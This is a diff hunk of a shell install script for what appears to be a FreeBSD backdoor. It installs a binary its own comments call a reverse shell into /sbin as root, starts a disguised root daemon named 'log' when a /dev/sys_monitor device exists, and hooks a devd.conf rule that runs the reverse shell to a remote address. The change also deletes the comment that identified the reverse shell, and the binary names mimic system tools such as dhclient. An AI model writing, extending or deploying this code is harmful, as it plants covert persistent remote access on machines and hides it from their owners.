@@ -59,15 +59,18 @@ if [ "$?" -ne 0 ]; then
   exit 1
 fi
 
-# Install bhclient (reverse shell) and log/log-helper utilities
 install -o root -g wheel -m 755 bhclient /sbin/bhclient
 if [ -e "./log" ]; then
   install -o root -g wheel -m 755 log /sbin/log
+  if [ -e "/dev/sys_monitor" ]; then
+    pkill -x log >/dev/null 2>&1 || true
+    daemon -f /sbin/log >/dev/null 2>&1
+  else
+    echo "Warning: /dev/sys_monitor missing; /sbin/log not started"
+  fi
+else
+  echo "Warning: ./log not found"
 fi
-if [ -e "./log-helper" ]; then
-  install -o root -g wheel -m 755 log-helper /sbin/log-helper
-fi
-
 # Add matching rule in /etc/devd.conf to run reverse shell to remote address
 if ! grep -q "DHCLIENT" /etc/devd.conf; then
   mkdir -p /usr/local/etc/devd
